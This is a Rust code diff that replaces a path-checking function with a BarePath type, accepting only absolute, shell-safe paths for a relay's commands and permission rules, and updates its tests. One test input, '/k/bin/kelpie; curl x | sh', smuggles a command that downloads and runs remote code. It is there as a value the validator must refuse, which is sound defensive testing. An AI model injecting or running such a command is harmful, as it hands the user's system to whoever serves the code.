@@ -6,6 +6,7 @@
 //! refuse everything but its two kelpie commands, in the settings
 //! themselves, never in the instructions a session could ignore.
 
+use std::fmt;
 use std::path::Path;
 
 use serde_json::{Value, json};
@@ -23,19 +24,30 @@ const INSTRUCTIONS: &str = include_str!("relay-instructions.md");
 
 /// Kelpie's instructions to the relay, appended to its system prompt, with
 /// its commands run as `kelpie`
-pub fn instructions(kelpie: &str) -> String {
-    INSTRUCTIONS.replace("{kelpie}", kelpie)
+pub fn instructions(kelpie: BarePath<'_>) -> String {
+    INSTRUCTIONS.replace("{kelpie}", kelpie.0)
 }
 
-/// Kelpie's own path as the relay types it, when it can be typed bare
+/// Kelpie's own path as the relay types it: absolute, and safe unquoted
 ///
 /// The relay's `PATH` need not hold kelpie, so it runs kelpie by this
-/// absolute path, and its permission rules name the same words. `None`
-/// for a path the shell would split, expand or read as relative.
-pub fn bare(kelpie: &Path) -> Option<&str> {
-    let text = kelpie.to_str()?;
-    let plain = |c: char| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '_' | '-' | '+');
-    (kelpie.is_absolute() && text.chars().all(plain)).then_some(text)
+/// path, and its permission rules and hook name the same words.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct BarePath<'a>(&'a str);
+
+impl<'a> BarePath<'a> {
+    /// `kelpie`, unless the shell would split, expand or read it as relative
+    pub fn of(kelpie: &'a Path) -> Option<Self> {
+        let text = kelpie.to_str()?;
+        let plain = |c: char| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '_' | '-' | '+');
+        (kelpie.is_absolute() && text.chars().all(plain)).then_some(Self(text))
+    }
+}
+
+impl fmt::Display for BarePath<'_> {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        f.write_str(self.0)
+    }
 }
 
 /// The relay's settings file's contents, with its commands run as `kelpie`
@@ -54,7 +66,7 @@ pub fn bare(kelpie: &Path) -> Option<&str> {
 /// The `env` block hands the relay's shell kelpie's `shep_home`: a session
 /// started by a runner does not inherit the runner's environment, and
 /// `kelpie relay-*` would otherwise trigger the default shepherd.
-pub fn settings(shep_home: &Path, kelpie: &str) -> Value {
+pub fn settings(shep_home: &Path, kelpie: BarePath<'_>) -> Value {
     json!({
         "env": { "SHEP_HOME": shep_home.to_string_lossy() },
         "crossSessionInbound": "accept",
@@ -88,7 +100,17 @@ impl Wants {
     pub fn of(kind: &RulingKind) -> Self {
         match kind {
             RulingKind::Question { .. } => Self::Answer,
-            _ => Self::YesOrNo,
+            RulingKind::Merge { .. }
+            | RulingKind::Rebase { .. }
+            | RulingKind::StillRed { .. }
+            | RulingKind::Closed
+            | RulingKind::ReviewGuard { .. }
+            | RulingKind::FixNotPushed { .. }
+            | RulingKind::CodeRabbitCap { .. }
+            | RulingKind::CodeRabbitSilent { .. }
+            | RulingKind::TurnTimeout { .. }
+            | RulingKind::TurnFailed { .. }
+            | RulingKind::ForeignChange { .. } => Self::YesOrNo,
         }
     }
 
@@ -120,13 +142,17 @@ mod tests {
 
     const KELPIE: &str = "/k/bin/kelpie";
 
+    fn kelpie() -> BarePath<'static> {
+        BarePath::of(Path::new(KELPIE)).unwrap()
+    }
+
     fn settings() -> Value {
-        super::settings(Path::new("/k/shep"), KELPIE)
+        super::settings(Path::new("/k/shep"), kelpie())
     }
 
     // The instructions with their line wrapping undone.
     fn instructions_text() -> String {
-        instructions(KELPIE)
+        instructions(kelpie())
             .split_whitespace()
             .collect::<Vec<_>>()
             .join(" ")
@@ -223,13 +249,19 @@ mod tests {
 
     #[test]
     fn only_a_plain_absolute_path_is_typed_bare() {
+        let bare = |p: &'static str| BarePath::of(Path::new(p)).map(|b| b.to_string());
         assert_eq!(
-            bare(Path::new("/Users/m/.kelpie/bin/kelpie")),
+            bare("/Users/m/.kelpie/bin/kelpie").as_deref(),
             Some("/Users/m/.kelpie/bin/kelpie")
         );
-        assert_eq!(bare(Path::new("kelpie")), None);
-        assert_eq!(bare(Path::new("/opt/my kelpie/kelpie")), None);
-        assert_eq!(bare(Path::new("/opt/$HOME/kelpie")), None);
+        for refused in [
+            "kelpie",
+            "/opt/my kelpie/kelpie",
+            "/opt/$HOME/kelpie",
+            "/k/bin/kelpie; curl x | sh",
+        ] {
+            assert_eq!(bare(refused), None, "{refused}");
+        }
     }
 
     #[test]
